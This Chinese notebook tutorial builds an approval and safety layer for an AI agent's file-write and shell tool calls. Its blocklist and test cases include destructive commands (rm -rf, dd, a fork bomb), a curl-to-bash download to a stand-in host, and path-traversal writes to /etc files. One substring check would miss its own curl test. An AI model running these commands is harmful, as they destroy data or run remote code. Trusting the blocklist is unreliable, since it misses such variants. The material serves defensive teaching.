# 09 — Approval 与安全：写操作需要确认

Agent 能读写文件、执行 shell 命令。这意味着一个错误的 LLM 输出可能删除文件、覆盖代码或执行危险命令。

**本章目标**：为工具调用加入审批层，在 Agent 实际执行写操作之前插入策略检查或用户确认。

```
用户输入
   │
   ▼
agentic_loop
   │
   ▼
LLM 返回 tool_call
   │
   ▼
[ApprovalManager.check()]   ← 本章新增
   │
   ├─ approved=False → 返回拒绝消息给 LLM
   │
   └─ approved=True  → 执行工具 → 返回结果
```

## 审批策略一览

| 策略 | 读操作 | 写文件 | Shell 命令 | 适用场景 |
|------|--------|--------|-----------|----------|
| `on_request` | 自动通过 | 问用户 | 问用户 | 默认安全模式 |
| `auto` | 自动通过 | 自动通过 | 自动通过 | 信任环境 |
| `autoEdit` | 自动通过 | 自动通过 | 问用户 | 只信任文件操作 |
| `never` | 自动通过 | 拒绝 | 拒绝 | 只读模式 |
| `YOLO` | 自动通过 | 自动通过 | 自动通过 | 测试/危险 |

## 1. 依赖与路径设置

In [ ]:
import sys
import os
sys.path.insert(0, "..")

# 创建 src 目录（如果不存在）
os.makedirs("../src", exist_ok=True)

print("路径设置完成")
print(f"sys.path[0] = {sys.path[0]}")

## 2. ApprovalPolicy 枚举

五种策略用枚举表示，便于类型检查和传参。

In [ ]:
from enum import Enum
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
import asyncio


class ApprovalPolicy(Enum):
    """Agent 操作审批策略"""
    ON_REQUEST = "on_request"   # 每次写操作都询问用户
    AUTO       = "auto"         # 所有操作自动通过（信任环境）
    AUTO_EDIT  = "autoEdit"     # 写文件自动，shell 需确认
    NEVER      = "never"        # 拒绝所有变更操作（只读模式）
    YOLO       = "YOLO"         # 全部通过（危险，仅测试用）


print("ApprovalPolicy 成员:")
for p in ApprovalPolicy:
    print(f"  {p.name:12s} → value={p.value!r}")

## 3. ToolConfirmation 数据类

在询问用户之前，先构造一个 `ToolConfirmation` 对象，包含人类可读的描述和风险级别。

In [ ]:
@dataclass
class ToolConfirmation:
    """工具调用确认请求"""
    tool_name:   str            # 工具名称，如 "write_file"
    parameters:  dict           # 原始参数字典
    description: str            # 人读描述，如「将写入文件 main.py，共 50 行」
    risk_level:  str            # "low" / "medium" / "high"

    def display(self) -> str:
        """生成终端展示文本"""
        risk_icons = {"low": "[LOW]", "medium": "[MED]", "high": "[!!!]"}
        icon = risk_icons.get(self.risk_level, "[???]")
        lines = [
            f"\n{'='*55}",
            f" {icon} 工具调用请求确认",
            f"{'='*55}",
            f" 工具:   {self.tool_name}",
            f" 描述:   {self.description}",
            f" 风险:   {self.risk_level.upper()}",
        ]
        # 显示关键参数（最多 3 个）
        for i, (k, v) in enumerate(self.parameters.items()):
            if i >= 3:
                lines.append(f" 参数:   ... (共 {len(self.parameters)} 个)")
                break
            v_str = str(v)
            if len(v_str) > 60:
                v_str = v_str[:57] + "..."
            lines.append(f" 参数:   {k}={v_str!r}")
        lines.append(f"{'='*55}")
        return "\n".join(lines)


# 演示
confirm = ToolConfirmation(
    tool_name="write_file",
    parameters={"path": "main.py", "content": "print('hello')\n" * 50},
    description="将写入文件 main.py，内容 50 行",
    risk_level="medium",
)
print(confirm.display())

## 4. ApprovalResult 数据类

`ApprovalManager.check()` 返回此对象，调用者根据 `approved` 决定是否继续。

In [ ]:
@dataclass
class ApprovalResult:
    """审批结果"""
    approved: bool          # True = 允许执行
    reason:   str           # 说明原因（用于日志或返回给 LLM）

    @classmethod
    def allow(cls, reason: str = "approved") -> "ApprovalResult":
        return cls(approved=True, reason=reason)

    @classmethod
    def deny(cls, reason: str = "denied") -> "ApprovalResult":
        return cls(approved=False, reason=reason)


print("allow:", ApprovalResult.allow("策略 AUTO，自动通过"))
print("deny: ", ApprovalResult.deny("策略 NEVER，拒绝写操作"))

## 5. 路径安全检查

防止路径穿越攻击（`../../etc/passwd`）。只允许 cwd 目录树内的路径。

In [ ]:
def is_safe_path(path_str: str, cwd: Path) -> bool:
    """
    检查 path_str 是否在 cwd 目录树内。
    拒绝 ../ 穿越和绝对路径逃逸。
    """
    try:
        # 解析为绝对路径
        target = Path(path_str)
        if not target.is_absolute():
            target = (cwd / target).resolve()
        else:
            target = target.resolve()
        cwd_resolved = cwd.resolve()
        # 判断是否在 cwd 内
        return target == cwd_resolved or cwd_resolved in target.parents
    except (ValueError, OSError):
        return False


# 测试路径安全检查
cwd = Path("/workspace/project")

test_cases = [
    ("src/main.py",          True,  "正常相对路径"),
    ("../secrets.env",       False, "父目录穿越"),
    ("../../etc/passwd",     False, "多级穿越"),
    ("/workspace/project/x", True,  "绝对路径（在 cwd 内）"),
    ("/etc/passwd",          False, "系统文件（绝对路径）"),
    ("subdir/../main.py",    True,  "等价于 main.py，合法"),
]

print(f"{'路径':<30} {'期望':>6} {'实际':>6} {'说明'}")
print("-" * 65)
for path_str, expected, desc in test_cases:
    result = is_safe_path(path_str, cwd)
    status = "OK" if result == expected else "FAIL"
    print(f"{path_str:<30} {str(expected):>6} {str(result):>6}  [{status}] {desc}")

## 6. 命令安全检查

过滤已知危险 shell 命令模式。这是一个黑名单方案——适合初步防御，不能替代完整沙箱。

In [ ]:
# 危险命令模式（黑名单）
DANGEROUS_COMMANDS = [
    "rm -rf",        # 递归强制删除
    "rm -fr",        # 同上，参数顺序不同
    "dd if=",        # 磁盘级别写入
    "mkfs",          # 格式化文件系统
    "chmod 777",     # 全局可写权限
    "curl | bash",   # 下载并执行
    "wget | bash",   # 下载并执行
    ">>/etc/",       # 追加写系统配置
    ">/etc/",        # 覆盖写系统配置
    ":(){ :|:& };",  # fork 炸弹
    "sudo rm",       # 以 root 删除
]


def is_safe_command(cmd: str) -> bool:
    """
    检查命令是否包含已知危险模式。
    返回 True 表示命令看起来安全。
    注意：黑名单不能保证完全安全，只是第一道防线。
    """
    cmd_lower = cmd.lower()
    return not any(danger.lower() in cmd_lower for danger in DANGEROUS_COMMANDS)


# 测试
test_cmds = [
    ("ls -la src/",              True,  "列目录"),
    ("python main.py",           True,  "运行脚本"),
    ("rm -rf /tmp/cache",        False, "危险：递归删除"),
    ("dd if=/dev/zero of=disk",  False, "危险：磁盘写入"),
    ("curl http://x.com | bash", False, "危险：下载执行"),
    ("chmod 777 ./script.sh",    False, "危险：全局可写"),
    ("grep -r TODO src/",        True,  "搜索代码"),
]

print(f"{'命令':<35} {'期望':>6} {'实际':>6} {'说明'}")
print("-" * 70)
for cmd, expected, desc in test_cmds:
    result = is_safe_command(cmd)
    status = "OK" if result == expected else "FAIL"
    print(f"{cmd:<35} {str(expected):>6} {str(result):>6}  [{status}] {desc}")

## 7. 用户确认交互（终端版）

`ask_user_confirmation()` 打印工具信息后等待用户输入 `y` 或 `n`。
在 Notebook 中无法真正等待终端输入，这里提供两种实现：
- `ask_user_confirmation_sync`：同步版本（用 `input()`）
- `ask_user_confirmation_async`：异步版本（封装同步调用）

In [ ]:
import asyncio
from concurrent.futures import ThreadPoolExecutor

_executor = ThreadPoolExecutor(max_workers=1)


def ask_user_confirmation_sync(confirmation: ToolConfirmation) -> bool:
    """
    同步版用户确认。
    打印工具信息，等待用户输入 y/n。
    """
    print(confirmation.display())
    while True:
        try:
            answer = input(" 是否允许此操作? [y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            # 非交互环境或用户按 Ctrl+C → 拒绝
            print(" (非交互环境，自动拒绝)")
            return False
        if answer in ("y", "yes"):
            return True
        if answer in ("n", "no", ""):
            return False
        print(" 请输入 y 或 n")


async def ask_user_confirmation(confirmation: ToolConfirmation) -> bool:
    """
    异步版用户确认。
    在 executor 中运行同步 input() 避免阻塞事件循环。
    """
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(
        _executor,
        ask_user_confirmation_sync,
        confirmation,
    )


print("ask_user_confirmation 已定义（同步 + 异步两版本）")
print("在非交互环境下，EOFError 会被捕获并自动拒绝")

## 8. ApprovalManager

这是核心类。`check()` 根据策略和工具类型决定：直接通过、直接拒绝、或询问用户。

```
check(tool, params)
    │
    ├─ tool.is_mutating() == False  →  allow (不可变工具不需审批)
    │
    ├─ YOLO                         →  allow (无条件通过)
    │
    ├─ NEVER                        →  deny  (无条件拒绝变更)
    │
    ├─ ON_REQUEST                   →  ask_user (所有变更都问)
    │
    ├─ AUTO
    │      ├─ is_safe_path ?         →  allow
    │      └─ 路径不安全             →  deny
    │
    └─ AUTO_EDIT
           ├─ WRITE + safe_path     →  allow
           ├─ WRITE + unsafe        →  deny
           └─ SHELL                 →  ask_user
```

In [ ]:
# 从前置章节导入 Tool 相关类型
# 如果 src/ 模块未安装，这里内联最小定义以便本章独立运行
try:
    from src.tool_framework import Tool, ToolKind, ToolResult, ToolRegistry
except ImportError:
    # 内联最小实现，保证本章可独立运行
    from abc import ABC, abstractmethod
    from enum import Enum as _Enum
    from dataclasses import dataclass as _dc

    class ToolKind(_Enum):
        READ    = "read"
        WRITE   = "write"
        SHELL   = "shell"
        NETWORK = "network"
        MEMORY  = "memory"
        MCP     = "mcp"

    @_dc
    class ToolResult:
        content:  str
        success:  bool
        metadata: dict
        is_error: bool = False

        @classmethod
        def ok(cls, content: str, **metadata) -> "ToolResult":
            return cls(content=content, success=True, metadata=metadata)

        @classmethod
        def error(cls, message: str, **metadata) -> "ToolResult":
            return cls(content=message, success=False, metadata=metadata, is_error=True)

    class Tool(ABC):
        @property
        @abstractmethod
        def name(self) -> str: ...

        @property
        @abstractmethod
        def description(self) -> str: ...

        @property
        @abstractmethod
        def kind(self) -> ToolKind: ...

        def is_mutating(self) -> bool:
            """变更操作返回 True"""
            return self.kind in (ToolKind.WRITE, ToolKind.SHELL)

        def schema(self) -> dict:
            return {"name": self.name, "description": self.description}

        async def execute(self, params: dict) -> ToolResult:
            raise NotImplementedError

        def validate(self, params: dict) -> list:
            return []

    print("使用内联 Tool 实现（src.tool_framework 未找到）")
else:
    print("成功导入 src.tool_framework")

In [ ]:
class ApprovalManager:
    """
    工具调用审批管理器。
    根据策略决定是否允许工具执行，必要时询问用户。
    """

    def __init__(self, policy: ApprovalPolicy, cwd: Path):
        self.policy = policy
        self.cwd    = cwd
        self._stats = {"approved": 0, "denied": 0, "asked": 0}

    # ------------------------------------------------------------------ #
    #  公开接口                                                            #
    # ------------------------------------------------------------------ #

    async def check(
        self,
        tool:   Tool,
        params: dict,
    ) -> ApprovalResult:
        """
        检查是否允许执行 tool(params)。
        返回 ApprovalResult。
        """
        # 不可变工具（只读）→ 直接通过
        if not tool.is_mutating():
            return self._record(ApprovalResult.allow("只读操作，自动通过"))

        # 根据策略分支
        if self.policy == ApprovalPolicy.YOLO:
            return self._record(ApprovalResult.allow("YOLO 模式，全部通过"))

        if self.policy == ApprovalPolicy.NEVER:
            return self._record(ApprovalResult.deny(
                f"策略 NEVER：拒绝变更操作 {tool.name}"
            ))

        if self.policy == ApprovalPolicy.ON_REQUEST:
            return await self._ask_user(tool, params)

        if self.policy == ApprovalPolicy.AUTO:
            return self._record(self._check_safety(tool, params))

        if self.policy == ApprovalPolicy.AUTO_EDIT:
            if tool.kind == ToolKind.WRITE:
                return self._record(self._check_safety(tool, params))
            else:  # SHELL 或其他变更工具
                return await self._ask_user(tool, params)

        # 未知策略 → 拒绝（防御性编程）
        return self._record(ApprovalResult.deny(f"未知策略 {self.policy}，拒绝"))

    @property
    def stats(self) -> dict:
        """返回审批统计"""
        return dict(self._stats)

    # ------------------------------------------------------------------ #
    #  内部方法                                                            #
    # ------------------------------------------------------------------ #

    def _check_safety(self, tool: Tool, params: dict) -> ApprovalResult:
        """
        在自动通过前做安全检查：
        - 文件操作：路径必须在 cwd 内
        - Shell 操作：命令不含危险模式
        """
        if tool.kind == ToolKind.WRITE:
            # 提取路径参数（write_file / edit_file 等工具惯用 "path"）
            path_str = params.get("path") or params.get("file_path", "")
            if path_str and not is_safe_path(str(path_str), self.cwd):
                return ApprovalResult.deny(
                    f"路径安全检查失败：{path_str!r} 超出工作目录"
                )
            return ApprovalResult.allow("安全检查通过，自动批准")

        if tool.kind == ToolKind.SHELL:
            cmd = params.get("command") or params.get("cmd", "")
            if cmd and not is_safe_command(str(cmd)):
                return ApprovalResult.deny(
                    f"命令安全检查失败：命令含危险模式 {cmd!r}"
                )
            return ApprovalResult.allow("命令安全检查通过，自动批准")

        return ApprovalResult.allow("自动批准")

    async def _ask_user(
        self,
        tool:   Tool,
        params: dict,
    ) -> ApprovalResult:
        """构造 ToolConfirmation 并询问用户"""
        self._stats["asked"] += 1
        confirmation = self._build_confirmation(tool, params)
        allowed = await ask_user_confirmation(confirmation)
        reason = "用户确认允许" if allowed else "用户拒绝"
        result = ApprovalResult.allow(reason) if allowed else ApprovalResult.deny(reason)
        return self._record(result)

    def _build_confirmation(self, tool: Tool, params: dict) -> ToolConfirmation:
        """根据工具和参数构造人类可读的确认信息"""
        if tool.kind == ToolKind.WRITE:
            path_str = params.get("path") or params.get("file_path", "(未知文件)")
            content  = params.get("content") or params.get("new_content", "")
            line_cnt = len(str(content).splitlines())
            desc     = f"将写入文件 {path_str}，内容约 {line_cnt} 行"
            risk     = "medium"
        elif tool.kind == ToolKind.SHELL:
            cmd  = params.get("command") or params.get("cmd", "(未知命令)")
            desc = f"将执行命令：{cmd}"
            risk = "high"
        else:
            desc = f"工具 {tool.name} 请求变更操作"
            risk = "medium"

        return ToolConfirmation(
            tool_name=tool.name,
            parameters=params,
            description=desc,
            risk_level=risk,
        )

    def _record(self, result: ApprovalResult) -> ApprovalResult:
        """记录统计并返回结果"""
        if result.approved:
            self._stats["approved"] += 1
        else:
            self._stats["denied"] += 1
        return result


print("ApprovalManager 定义完成")

## 9. 测试工具桩

为测试创建几个简单的桩工具，不依赖真实文件系统。

In [ ]:
class StubReadTool(Tool):
    """只读工具桩"""
    @property
    def name(self): return "read_file"
    @property
    def description(self): return "读取文件内容"
    @property
    def kind(self): return ToolKind.READ
    async def execute(self, params): return ToolResult.ok("文件内容")


class StubWriteTool(Tool):
    """写文件工具桩"""
    @property
    def name(self): return "write_file"
    @property
    def description(self): return "写入文件"
    @property
    def kind(self): return ToolKind.WRITE
    async def execute(self, params): return ToolResult.ok("写入成功")


class StubShellTool(Tool):
    """Shell 工具桩"""
    @property
    def name(self): return "bash"
    @property
    def description(self): return "执行 shell 命令"
    @property
    def kind(self): return ToolKind.SHELL
    async def execute(self, params): return ToolResult.ok("命令输出")


read_tool  = StubReadTool()
write_tool = StubWriteTool()
shell_tool = StubShellTool()

print(f"read_tool.is_mutating()  = {read_tool.is_mutating()}")
print(f"write_tool.is_mutating() = {write_tool.is_mutating()}")
print(f"shell_tool.is_mutating() = {shell_tool.is_mutating()}")

## 10. 各策略行为测试（不需要用户输入）

测试 `NEVER`、`YOLO`、`AUTO`、`AUTO_EDIT` 四种策略对读/写/shell 操作的处理结果。

`ON_REQUEST` 需要用户交互，在非交互环境下 EOFError 会被捕获并自动拒绝，见后续 cell。

In [ ]:
import asyncio

cwd = Path("/workspace/project")

# 参数
write_params = {"path": "src/main.py", "content": "print('hello')\n" * 10}
shell_params = {"command": "ls -la src/"}
read_params  = {"path": "README.md"}
unsafe_write = {"path": "../../etc/crontab", "content": "* * * * * rm -rf /"}
unsafe_shell = {"command": "rm -rf /tmp"}


async def run_policy_tests():
    """逐一测试各策略下不同工具的审批结果"""
    scenarios = [
        # (策略, 工具, 参数, 场景说明)
        (ApprovalPolicy.NEVER,    read_tool,  read_params,   "NEVER + 读操作"),
        (ApprovalPolicy.NEVER,    write_tool, write_params,  "NEVER + 写文件"),
        (ApprovalPolicy.NEVER,    shell_tool, shell_params,  "NEVER + Shell"),
        (ApprovalPolicy.YOLO,     write_tool, write_params,  "YOLO  + 写文件"),
        (ApprovalPolicy.YOLO,     shell_tool, unsafe_shell,  "YOLO  + 危险命令"),
        (ApprovalPolicy.AUTO,     write_tool, write_params,  "AUTO  + 正常写"),
        (ApprovalPolicy.AUTO,     write_tool, unsafe_write,  "AUTO  + 路径穿越"),
        (ApprovalPolicy.AUTO,     shell_tool, shell_params,  "AUTO  + Shell"),
        (ApprovalPolicy.AUTO,     shell_tool, unsafe_shell,  "AUTO  + 危险命令"),
        (ApprovalPolicy.AUTO_EDIT,write_tool, write_params,  "AUTO_EDIT + 写文件"),
        (ApprovalPolicy.AUTO_EDIT,write_tool, unsafe_write,  "AUTO_EDIT + 路径穿越"),
    ]

    print(f"{'策略':<12} {'工具':<12} {'结果':>8}  场景说明 / 原因")
    print("-" * 80)

    for policy, tool, params, desc in scenarios:
        mgr    = ApprovalManager(policy, cwd)
        result = await mgr.check(tool, params)
        status = "允许" if result.approved else "拒绝"
        # 截断过长的 reason
        reason = result.reason
        if len(reason) > 30:
            reason = reason[:27] + "..."
        print(f"{policy.value:<12} {tool.name:<12} {status:>4}   {desc} | {reason}")

await run_policy_tests()

## 11. ON_REQUEST 策略测试（非交互环境）

在 Notebook 等非交互环境中，`input()` 会抛出 `EOFError`，被捕获后自动拒绝。
这模拟了 CI/CD 或自动化环境中的安全默认行为。

In [ ]:
async def test_on_request_non_interactive():
    """ON_REQUEST 在非交互环境下自动拒绝"""
    mgr = ApprovalManager(ApprovalPolicy.ON_REQUEST, cwd)

    print("测试 ON_REQUEST 策略（非交互环境）")
    print("注意：非交互环境中 input() 抛出 EOFError，自动拒绝")
    print()

    # 读操作：不需要确认，直接通过
    r = await mgr.check(read_tool, read_params)
    print(f"读操作  → 允许={r.approved} | {r.reason}")

    # 写操作：需要用户确认，非交互下自动拒绝
    r = await mgr.check(write_tool, write_params)
    print(f"写操作  → 允许={r.approved} | {r.reason}")

    # Shell：需要用户确认，非交互下自动拒绝
    r = await mgr.check(shell_tool, shell_params)
    print(f"Shell   → 允许={r.approved} | {r.reason}")

    print(f"\n统计: {mgr.stats}")

await test_on_request_non_interactive()

## 12. 集成到 agentic_loop

展示如何将 `ApprovalManager` 嵌入 Agent 循环。关键位置：**TOOL_CALL_START 之后、invoke 之前**。

In [ ]:
from typing import AsyncGenerator


async def agentic_loop_with_approval(
    ctx,                           # ContextManager 实例
    client,                        # LLMClient 实例
    registry,                      # ToolRegistry 实例
    approval_manager: ApprovalManager,
    max_turns: int = 10,
) -> str:
    """
    带审批层的 Agent 主循环。

    在每次工具调用前插入 approval_manager.check()，
    若被拒绝则把拒绝原因作为工具结果返回给 LLM，
    让 LLM 根据拒绝信息调整策略（而不是直接报错）。
    """
    import json

    for turn in range(max_turns):
        messages = ctx.get_messages()
        tools    = registry.get_schemas() if hasattr(registry, "get_schemas") else []

        # 调用 LLM
        response, usage = await client.chat_completion(messages, tools=tools or None)
        ctx.update_usage(usage.prompt_tokens, usage.completion_tokens)

        # 解析是否有工具调用（简化版：实际项目中应解析 tool_calls 字段）
        # 这里演示逻辑结构，实际 LLM 返回结构由 LLMClient 决定
        tool_calls = getattr(response, "tool_calls", None)

        if not tool_calls:
            # 纯文本回复，对话结束
            ctx.add_assistant_message(str(response))
            return str(response)

        # 处理每个工具调用
        ctx.add_assistant_message("", tool_calls=tool_calls)

        for call in tool_calls:
            call_id   = call["id"]
            tool_name = call["function"]["name"]
            params    = json.loads(call["function"].get("arguments", "{}"))

            tool = registry.get(tool_name)
            if tool is None:
                ctx.add_tool_result(call_id, f"错误：工具 {tool_name!r} 未注册")
                continue

            # ── 审批检查（核心新增逻辑）──────────────────────────────
            approval = await approval_manager.check(tool, params)
            if not approval.approved:
                # 拒绝：把原因作为工具结果返回 LLM
                ctx.add_tool_result(
                    call_id,
                    f"工具调用被拒绝: {approval.reason}"
                )
                continue
            # ────────────────────────────────────────────────────────

            # 执行工具
            result = await registry.invoke(tool_name, params)
            ctx.add_tool_result(call_id, result.content)

    return "(已达最大轮次)"


print("agentic_loop_with_approval 定义完成")
print()
print("关键逻辑（伪代码）:")
print("""
for call in tool_calls:
    approval = await approval_manager.check(tool, params)  # ← 审批检查
    if not approval.approved:
        ctx.add_tool_result(call_id, f"工具调用被拒绝: {approval.reason}")
        continue                                            # ← 跳过执行
    result = await registry.invoke(tool_name, params)      # ← 实际执行
    ctx.add_tool_result(call_id, result.content)
""")

## 13. 完整端到端演示（模拟场景，不调用 LLM）

构造一批模拟工具调用，通过 `ApprovalManager` 逐一处理，展示实际审批流程。

In [ ]:
async def demo_approval_flow(policy: ApprovalPolicy):
    """模拟 Agent 循环中的审批流程"""
    print(f"\n{'='*60}")
    print(f" 策略: {policy.value}")
    print(f"{'='*60}")

    mgr = ApprovalManager(policy, cwd)

    # 模拟 Agent 产生的工具调用序列
    calls = [
        (read_tool,  {"path": "README.md"},                       "读取 README"),
        (write_tool, {"path": "src/output.py", "content": "# 生成代码\n" * 20}, "写入 output.py"),
        (shell_tool, {"command": "python src/output.py"},         "运行脚本"),
        (write_tool, {"path": "../../etc/hosts", "content": "0.0.0.0 evil.com"}, "路径穿越写入"),
        (shell_tool, {"command": "rm -rf /tmp/test"},             "危险命令"),
    ]

    for tool, params, desc in calls:
        result = await mgr.check(tool, params)
        status = "✓ 允许" if result.approved else "✗ 拒绝"
        # 截断原因
        reason = result.reason[:35] + ("..." if len(result.reason) > 35 else "")
        print(f"  {status}  {desc:<25}  原因: {reason}")

    print(f"\n  统计: approved={mgr.stats['approved']}, denied={mgr.stats['denied']}, asked={mgr.stats['asked']}")


# 测试四种主要策略
for policy in [ApprovalPolicy.NEVER, ApprovalPolicy.AUTO, ApprovalPolicy.AUTO_EDIT, ApprovalPolicy.YOLO]:
    await demo_approval_flow(policy)

## 14. 错误场景处理

展示几种异常情况下的健壮性。

In [ ]:
async def test_edge_cases():
    """边界和错误场景测试"""
    mgr = ApprovalManager(ApprovalPolicy.AUTO, cwd)

    print("=== 边界场景测试 ===")

    # 1. 参数中路径为 None
    r = await mgr.check(write_tool, {"path": None, "content": "x"})
    print(f"路径为 None  → {r.approved} | {r.reason}")

    # 2. 空参数字典
    r = await mgr.check(write_tool, {})
    print(f"空参数       → {r.approved} | {r.reason}")

    # 3. 命令为空字符串
    r = await mgr.check(shell_tool, {"command": ""})
    print(f"空命令       → {r.approved} | {r.reason}")

    # 4. 路径包含特殊字符但在 cwd 内
    r = await mgr.check(write_tool, {"path": "src/file name with spaces.py"})
    print(f"路径含空格   → {r.approved} | {r.reason}")

    # 5. 命令包含危险词但只是注释（黑名单局限性演示）
    r = await mgr.check(shell_tool, {"command": "echo 'rm -rf is dangerous'"})
    print(f"危险词在注释 → {r.approved} | {r.reason}")
    print("  ^ 黑名单误判：echo 无害但被拦截，黑名单有局限性")

await test_edge_cases()

## 15. 保存核心代码到 src/approval_manager.py

In [ ]:
approval_manager_src = '''
"""
src/approval_manager.py

Agent 工具调用审批层。
根据策略决定是否允许写操作，必要时询问用户确认。
"""

from __future__ import annotations

import asyncio
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from src.tool_framework import Tool, ToolKind

# ============================================================
#  策略枚举
# ============================================================

class ApprovalPolicy(Enum):
    """Agent 操作审批策略"""
    ON_REQUEST = "on_request"   # 每次写操作都询问用户
    AUTO       = "auto"         # 所有操作自动通过（信任环境）
    AUTO_EDIT  = "autoEdit"     # 写文件自动，shell 需确认
    NEVER      = "never"        # 拒绝所有变更操作（只读模式）
    YOLO       = "YOLO"         # 全部通过（危险，仅测试用）


# ============================================================
#  数据类
# ============================================================

@dataclass
class ToolConfirmation:
    """工具调用确认请求"""
    tool_name:   str
    parameters:  dict
    description: str    # 人读描述
    risk_level:  str    # "low" / "medium" / "high"

    def display(self) -> str:
        """生成终端展示文本"""
        risk_icons = {"low": "[LOW]", "medium": "[MED]", "high": "[!!!]"}
        icon = risk_icons.get(self.risk_level, "[???]")
        lines = [
            f"\\n{\"=\"*55}",
            f" {icon} 工具调用请求确认",
            f"{\"=\"*55}",
            f" 工具:   {self.tool_name}",
            f" 描述:   {self.description}",
            f" 风险:   {self.risk_level.upper()}",
        ]
        for i, (k, v) in enumerate(self.parameters.items()):
            if i >= 3:
                lines.append(f" 参数:   ... (共 {len(self.parameters)} 个)")
                break
            v_str = str(v)
            if len(v_str) > 60:
                v_str = v_str[:57] + "..."
            lines.append(f" 参数:   {k}={v_str!r}")
        lines.append(f"{\"=\"*55}")
        return "\\n".join(lines)


@dataclass
class ApprovalResult:
    """审批结果"""
    approved: bool
    reason:   str

    @classmethod
    def allow(cls, reason: str = "approved") -> "ApprovalResult":
        return cls(approved=True, reason=reason)

    @classmethod
    def deny(cls, reason: str = "denied") -> "ApprovalResult":
        return cls(approved=False, reason=reason)


# ============================================================
#  安全检查函数
# ============================================================

DANGEROUS_COMMANDS = [
    "rm -rf", "rm -fr", "dd if=", "mkfs", "chmod 777",
    "curl | bash", "wget | bash", ">>/etc/", ">/etc/",
    ":(){ :|:& };", "sudo rm",
]


def is_safe_path(path_str: str, cwd: Path) -> bool:
    """检查路径是否在 cwd 目录树内，防止路径穿越"""
    try:
        target = Path(path_str)
        if not target.is_absolute():
            target = (cwd / target).resolve()
        else:
            target = target.resolve()
        cwd_resolved = cwd.resolve()
        return target == cwd_resolved or cwd_resolved in target.parents
    except (ValueError, OSError):
        return False


def is_safe_command(cmd: str) -> bool:
    """检查命令是否含有已知危险模式"""
    cmd_lower = cmd.lower()
    return not any(danger.lower() in cmd_lower for danger in DANGEROUS_COMMANDS)


# ============================================================
#  用户确认交互
# ============================================================

_executor = ThreadPoolExecutor(max_workers=1)


def ask_user_confirmation_sync(confirmation: ToolConfirmation) -> bool:
    """同步版用户确认（阻塞等待输入）"""
    print(confirmation.display())
    while True:
        try:
            answer = input(" 是否允许此操作? [y/n]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print(" (非交互环境，自动拒绝)")
            return False
        if answer in ("y", "yes"):
            return True
        if answer in ("n", "no", ""):
            return False
        print(" 请输入 y 或 n")


async def ask_user_confirmation(confirmation: ToolConfirmation) -> bool:
    """异步版用户确认"""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_executor, ask_user_confirmation_sync, confirmation)


# ============================================================
#  ApprovalManager
# ============================================================

class ApprovalManager:
    """工具调用审批管理器"""

    def __init__(self, policy: ApprovalPolicy, cwd: Path):
        self.policy = policy
        self.cwd    = cwd
        self._stats = {"approved": 0, "denied": 0, "asked": 0}

    async def check(self, tool: "Tool", params: dict) -> ApprovalResult:
        """检查是否允许执行 tool(params)"""
        from src.tool_framework import ToolKind

        if not tool.is_mutating():
            return self._record(ApprovalResult.allow("只读操作，自动通过"))

        if self.policy == ApprovalPolicy.YOLO:
            return self._record(ApprovalResult.allow("YOLO 模式，全部通过"))

        if self.policy == ApprovalPolicy.NEVER:
            return self._record(ApprovalResult.deny(f"策略 NEVER：拒绝变更操作 {tool.name}"))

        if self.policy == ApprovalPolicy.ON_REQUEST:
            return await self._ask_user(tool, params)

        if self.policy == ApprovalPolicy.AUTO:
            return self._record(self._check_safety(tool, params))

        if self.policy == ApprovalPolicy.AUTO_EDIT:
            if tool.kind == ToolKind.WRITE:
                return self._record(self._check_safety(tool, params))
            return await self._ask_user(tool, params)

        return self._record(ApprovalResult.deny(f"未知策略 {self.policy}，拒绝"))

    @property
    def stats(self) -> dict:
        return dict(self._stats)

    def _check_safety(self, tool: "Tool", params: dict) -> ApprovalResult:
        from src.tool_framework import ToolKind
        if tool.kind == ToolKind.WRITE:
            path_str = params.get("path") or params.get("file_path", "")
            if path_str and not is_safe_path(str(path_str), self.cwd):
                return ApprovalResult.deny(f"路径安全检查失败：{path_str!r} 超出工作目录")
            return ApprovalResult.allow("安全检查通过，自动批准")
        if tool.kind == ToolKind.SHELL:
            cmd = params.get("command") or params.get("cmd", "")
            if cmd and not is_safe_command(str(cmd)):
                return ApprovalResult.deny(f"命令安全检查失败：{cmd!r}")
            return ApprovalResult.allow("命令安全检查通过，自动批准")
        return ApprovalResult.allow("自动批准")

    async def _ask_user(self, tool: "Tool", params: dict) -> ApprovalResult:
        self._stats["asked"] += 1
        confirmation = self._build_confirmation(tool, params)
        allowed = await ask_user_confirmation(confirmation)
        reason = "用户确认允许" if allowed else "用户拒绝"
        return self._record(ApprovalResult.allow(reason) if allowed else ApprovalResult.deny(reason))

    def _build_confirmation(self, tool: "Tool", params: dict) -> ToolConfirmation:
        from src.tool_framework import ToolKind
        if tool.kind == ToolKind.WRITE:
            path_str = params.get("path") or params.get("file_path", "(未知文件)")
            content  = params.get("content") or params.get("new_content", "")
            line_cnt = len(str(content).splitlines())
            return ToolConfirmation(tool.name, params, f"将写入文件 {path_str}，内容约 {line_cnt} 行", "medium")
        if tool.kind == ToolKind.SHELL:
            cmd = params.get("command") or params.get("cmd", "(未知命令)")
            return ToolConfirmation(tool.name, params, f"将执行命令：{cmd}", "high")
        return ToolConfirmation(tool.name, params, f"工具 {tool.name} 请求变更操作", "medium")

    def _record(self, result: ApprovalResult) -> ApprovalResult:
        if result.approved:
            self._stats["approved"] += 1
        else:
            self._stats["denied"] += 1
        return result


__all__ = [
    "ApprovalPolicy",
    "ToolConfirmation",
    "ApprovalResult",
    "ApprovalManager",
    "is_safe_path",
    "is_safe_command",
    "ask_user_confirmation",
    "ask_user_confirmation_sync",
    "DANGEROUS_COMMANDS",
]
'''

import os
os.makedirs("../src", exist_ok=True)

with open("../src/approval_manager.py", "w", encoding="utf-8") as f:
    f.write(approval_manager_src.strip())

print("已写入 src/approval_manager.py")
print(f"文件大小: {os.path.getsize('../src/approval_manager.py')} bytes")

## 小结

| 模块 | 作用 |
|------|------|
| `ApprovalPolicy` | 枚举五种审批策略：on_request / auto / autoEdit / never / YOLO |
| `ToolConfirmation` | 封装工具调用的人读描述和风险级别，用于展示给用户 |
| `ApprovalResult` | 审批结果：approved + reason，传递给调用方 |
